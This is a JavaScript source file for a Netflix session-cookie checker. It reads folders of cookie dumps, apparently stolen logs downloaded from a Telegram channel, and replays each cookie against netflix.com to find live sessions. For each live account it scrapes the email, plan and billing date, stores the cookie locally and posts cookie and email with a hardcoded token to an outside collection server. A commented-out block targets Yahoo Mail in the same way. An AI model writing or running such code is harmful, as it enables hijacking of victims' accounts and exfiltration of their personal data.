import axios from "axios";
import {
    writeFileSync,
    existsSync,
    mkdirSync,
    readdirSync,
    statSync,
    readFileSync
} from "fs";
import { createInterface } from "readline";
import cookiesDb from "./cookies.json" assert { type: "json" };
const rl = createInterface({
    input: process.stdin,
    output: process.stdout
});

//const host = "https://netflix-code-api.onrender.com";
const host = "https://netflix-code-api.squareweb.app";
//const host = 'http://localhost:8000'
const Red = "\x1b[31m";
const Green = "\x1b[32m";
const Yellow = "\x1b[33m";

class CookieChecker {
    constructor({ Directory }) {
        this.Directory = Directory;
    }

    async readFolders(Directory) {
        if (!existsSync(Directory)) mkdirSync(Directory);

        const pathFolderAndFiles = await readdirSync(Directory);

        const pathFolders = pathFolderAndFiles.filter(
            folderName => !statSync(`${Directory}/${folderName}`).isFile()
        );
        return await pathFolders;
    }
    parseNetscapeCookieString(cookieString) {

        const cookies = {};
        if (cookieString.length < 10 || !cookieString.includes("\n")) {
            console.log("cookie invalido");
            return null;
        }
        const lines = cookieString.split("\n");
        lines.forEach(line => {
            const parts = line.split("\t");
            if (parts.length >= 7) {
                const domain = parts[0].trim();
                const flag = parts[1].trim() === "TRUE";
                const path = parts[2].trim();
                const secure = parts[3].trim() === "TRUE";
                const expires = parseInt(parts[4].trim());
                const name = parts[5].trim();
                const value = parts[6].trim();
                cookies[name] = { value, domain, path, secure, expires, flag };
            }
        });

        return Object.entries(cookies)
            .map(([name, cookie]) => `${name}=${cookie.value}`)
            .join("; ");
    }

    async dfs(matrix) {
        const pathsCookies = new Array();
        async function ReadPaths(CurrentDirectory) {
            const pathFolderAndFiles = await readdirSync(CurrentDirectory);

            pathFolderAndFiles.map(file => {
                if (
                    statSync(`${CurrentDirectory}/${file}`).isFile() &&
                    file.includes(".txt")
                )
                    pathsCookies.push(`${CurrentDirectory}/${file}`);
            });

            const pathFolders = pathFolderAndFiles.filter(
                folderName =>
                    !statSync(`${CurrentDirectory}/${folderName}`).isFile()
            );
            return pathFolders;
        }
        async function LoopDfs({ CurrentDirectory, vetor }) {
            for (let i = 0; i < vetor.length; i++) {
                LoopDfs({
                    CurrentDirectory: CurrentDirectory + "/" + vetor[i],
                    vetor: await ReadPaths(CurrentDirectory + "/" + vetor[i])
                });
            }
        }

        await LoopDfs({
            CurrentDirectory: matrix,
            vetor: await ReadPaths(matrix)
        });
        return await pathsCookies;
    }
 async  CheckerCookieX({cookieNetScape}) {
  const getStr = (string, start, end) => {
    return string.match(`${start}(.*?)${end}`)?.[1];
};
const cookie = this.parseNetscapeCookieString(cookieNetScape)
const testOne = await axios({
          url: "https://www.netflix.com/browse",
        method: "GET",
        headers: {
            Cookie: String(cookie)
        }
})
const currentUrltestOne = testOne.request["_redirectable"]["_currentUrl"];
if(currentUrltestOne != 'https://www.netflix.com/browse') {console.log(
                `${Red}[ Die ]${Yellow} - Redirect to  >>${Red} [ ${currentUrltestOne} ] ${Yellow}>> Invalid cookie`
            );

  return
}
    const response = await axios({
        url: "https://www.netflix.com/account",
        method: "GET",
        headers: {
            Cookie: String(cookie)
        }
    });
    const currentUrl = response.request["_redirectable"]["_currentUrl"];

    if (
        currentUrl === "https://www.netflix.com/account" ||
        currentUrl === "https://www.netflix.com/YourAccount"
    ) {
        const { data } = response;
        const startAccount = getStr(
            data,
            'account-section-membersince--svg"></div>',
            "</"
        );
        const email = getStr(
            data,
            'account-section-item account-section-email">',
            "</"
        );
        const nextInvoice = getStr(data, 'nextBillingDate-item">', "</");
        const typePlan = getStr(data, 'data-uia="plan-label"><b>', "</");
        cookiesDb.push({
          cookie: cookie
        })
 writeFileSync("cookies.json", JSON.stringify(cookiesDb));

            console.log(
                `${Green}[ Live ] ${Yellow} - Redirect to >> ${Green} [ ${currentUrl} ] ${Yellow}>> Cookie is valid `
            );
        console.log( {
            startAccount: startAccount,
            email: email,
            nextInvoice: nextInvoice ? nextInvoice.match(/\d{1,2}(.*?)\d{4}/)?.[0] : nextInvoice,
            typePlan: typePlan
        })
        console.log(cookie)
        if(!email) return;
        const resultRequest = await axios({
            //  timeout: 15000,
            method:'POST',
            url: host+'/addcookie',
            data: {
                  token:'0a3c6d2e365a05bea22fd385e16c7715',
                data:{
                cookie: cookie,
                email: email,
                }
            }
        });
        console.log( resultRequest.data)
        return
    }

    console.log(
                `${Red}[ Die ]${Yellow} - Redirect to  >>${Red} [ ${currentUrl} ] ${Yellow}>> Invalid cookie`
            );
}
    async requestSite({ cookieNetScape, url, die, live }) {
        const cookieParse = this.parseNetscapeCookieString(cookieNetScape);
        if (!cookieParse) return;
        const resultRequest = await axios({
            //  timeout: 15000,
            url: url,
            headers: {
                Cookie: cookieParse
            }
        });

        //console.log(resultRequest.request[''])
        const finalHost = resultRequest.request["_redirectable"]["_currentUrl"];
        // console.log(resultRequest.request)
        if (
            finalHost.includes(live) // ||
//             finalHost == "https://www.netflix.com/br-en/"
        ) {
            //console.log(cookieNetScape)
            //  console.log(resultRequest.request)

            const idfolder = Math.floor(Math.random() * 100);
            const agora = new Date();
            const hora = agora.getHours().toString().padStart(2, "0");
            const minutos = agora.getMinutes().toString().padStart(2, "0");
            const dia = agora.getDate().toString().padStart(2, "0");
            const mes = (agora.getMonth() + 1).toString().padStart(2, "0"); // Adiciona +1 porque o mês começa em 0
            const ano = agora.getFullYear();

            const stringFormatada = `${hora};${minutos}  ${dia}|${mes}|${ano}`;
            const path = `lives/netflix  [  ]/`;

            if (!existsSync("lives/")) mkdirSync("lives/");
            if (!existsSync(path)) mkdirSync(path);
            if (!existsSync(path + idfolder)) mkdirSync(path + idfolder);
            writeFileSync(
                path + idfolder + "/cookie.txt",
                String(cookieNetScape)
            );
            writeFileSync(
                path + idfolder + "/r.html",
                String(resultRequest.data)
            );
            cookiesDb.push(cookieParse);
            const replayApi = await axios({
                            url: host + "/addCookie",
                           method: "POST",
                          data: {
                                token: "0a3c6d2e365a05bea22fd385e16c7715",
                                data: {
                                    cookie: cookieParse
                  }
                         }
                     });

            console.log(replayApi.data);
            writeFileSync("cookies.json", JSON.stringify(cookiesDb));

            console.log(
                `${Green}[ Live ] ${Yellow} - Redirect to >> ${Green} [ ${finalHost} ] ${Yellow}>> Cookie is valid `
            );
            return;
        }
        if (
            finalHost.includes(die) ||
            finalHost.includes(
                "https://www.netflix.com/br-en/login?nextpage=https%3A%2F%2Fwww.netflix.com%2Fbrowse"
            )
        ) {
            console.log(
                `${Red}[ Die ]${Yellow} - Redirect to  >>${Red} [ ${finalHost} ] ${Yellow}>> Invalid cookie`
            );
            return;
        }

        // if (!existsSync("lives/")) mkdirSync("lives");
        //         if (!existsSync("lives/netflix")) mkdirSync("lives/netflix");
        //         if (!existsSync("lives/netflix/" + idfolder))
        //             mkdirSync("lives/netflix/" + idfolder);
        //         writeFileSync(
        //             "lives/netflix/" + idfolder + "/cookie.txt",
        //             String(cookieNetScape)
        //         );
        //         writeFileSync(
        //             "lives/netflix/" + idfolder + "/r.html",
        //             String(resultRequest.data)
        //         );
        console.log(
            `${Yellow}[ undefined ] - Redirect to  >> [ ${finalHost} ] >> cookie is undefined`
        );
    }
    async main() {
        const Folders = await this.readFolders(this.Directory);

        if (Folders.length < 1)
            return "Error, without folders in the Directory";

        const selectFolder = Folders.map(
            (folder, index) => `${index}. - ${folder}`
        );

        rl.question(
            `please, select folder \n${selectFolder.join("\n")} \n`,
            async indexSlected => {
                const pathCookies = Folders[indexSlected];
                if (!pathCookies) {
                    console.log("indice invalido");
                    rl.close();
                }

                const cookies = await this.dfs(
                    `${this.Directory}/${pathCookies}`
                );
                // console.log(cookies[5])

                const quantityOfPartsDebt =
                    cookies.length >= 2 ? Math.floor(cookies.length / 1) : 1;
                const quantityPerPart = cookies.length / quantityOfPartsDebt;
                const poha = [{ last: 0 }];

                for (let i = 1; i <= quantityOfPartsDebt; i++) {
                    const lastObject = poha.pop()?.last;
                    const readding = new Array();
                    const slamn = Math.floor(lastObject + quantityPerPart);

                    poha.push({
                        last: slamn
                    });
                    for (let o = lastObject; o <= slamn; o++) {
                        if (cookies[o])
                            readding.push(readFileSync(cookies[o], "utf-8"));
                    }

                    //console.log(readding)

                    const cookiesValid = [];

                    readding.map(txt => {
                        const cookieInFile = [];

                        txt.split("\n").map(texto => {
                            if (texto.includes("netflix"))
                                cookieInFile.push(texto);
                        });
                        if (cookieInFile.length > 4)
                            cookiesValid.push(cookieInFile.join("\n"));
                    });

                    for (let i in cookiesValid) {
                        //   cookiesValid.map(async cookieNetScape => {
                        const cookieNetScape = cookiesValid[i];
                        const cookieParse =
                            this.parseNetscapeCookieString(cookieNetScape);
                        try {
                            /*  await this.requestSite({
  cookieNetScape : cookieNetScape,
  url : 'https://mail.yahoo.com/m/folders/1',
  die : 'login.yahoo',
  live : 'mail'
})*/
                            await this.CheckerCookieX({
                                cookieNetScape: cookieNetScape,
                            });
                        } catch (e) {
                            if (
                                e?.message.includes(
                                    'Invalid character in header content ["Cookie"]'
                                )
                            ) {
                                return;
                            }await this.CheckerCookieX({
                                cookieNetScape: cookieNetScape,
                            })
                            .catch(async e => {
                                console.log(e)
                            });
                        }
                    }
                }

                rl.close();
            }
        );
    }
}
const initializeChecker = new CookieChecker({
    Directory: "C:/Users/W10/Downloads/Telegram Desktop/@Inferno_Cloud FREE#80/@Inferno_Cloud FREE#80"
});

const Folders = await initializeChecker.main();
console.log(Folders);